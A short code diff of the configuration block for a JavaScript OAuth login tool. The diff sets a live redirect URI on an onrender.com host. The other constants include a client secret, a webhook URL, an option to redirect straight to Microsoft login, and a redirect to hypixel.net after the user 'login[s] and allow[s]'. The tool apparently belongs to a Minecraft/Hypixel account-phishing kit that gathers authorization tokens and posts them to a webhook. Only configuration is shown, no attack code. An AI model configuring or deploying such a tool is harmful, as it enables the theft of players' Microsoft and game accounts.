@@ -1,7 +1,7 @@
 //Change these
 const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = ''
-const redirect_uri = ''
+const redirect_uri = 'https://oauth1-8.onrender.com'
 const webhook_url = ''
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = false //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
